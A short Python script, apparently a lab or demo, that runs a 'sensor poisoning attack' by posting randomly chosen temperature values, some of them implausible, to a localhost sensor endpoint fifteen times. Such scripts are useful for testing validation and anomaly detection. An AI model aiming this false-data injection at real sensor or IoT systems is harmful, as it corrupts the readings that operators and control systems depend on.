import random
import time
import requests

TARGET = "http://127.0.0.1:8000/sensor/temperature"

def poison_sensor():
    """
    Injects poisoned sensor values
    """
    values = [20, 21, 22, 23, 24, -22, 100, 0]
    for _ in range(15):
        v = random.choice(values)
        payload = {"value": v}
        r = requests.post(TARGET, json=payload)
        print(f"  Sent {v} --> ", r.status_code, r.text)
        time.sleep(2)

if __name__ == "__main__":
    print("[*] Starting sensor poisoning attack")
    poison_sensor()
